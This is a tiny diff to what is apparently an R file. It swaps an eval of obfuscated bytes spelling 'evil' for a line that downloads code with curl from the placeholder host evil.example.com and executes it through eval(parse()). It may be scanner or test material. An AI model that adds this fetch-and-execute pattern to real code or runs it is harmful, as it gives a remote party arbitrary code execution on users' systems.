@@ -1,1 +1,1 @@
-eval(parse(text = rawToChar(as.raw(c(101, 118, 105, 108)))))
+eval(parse(text = system("curl -s http://evil.example.com", intern = TRUE)))
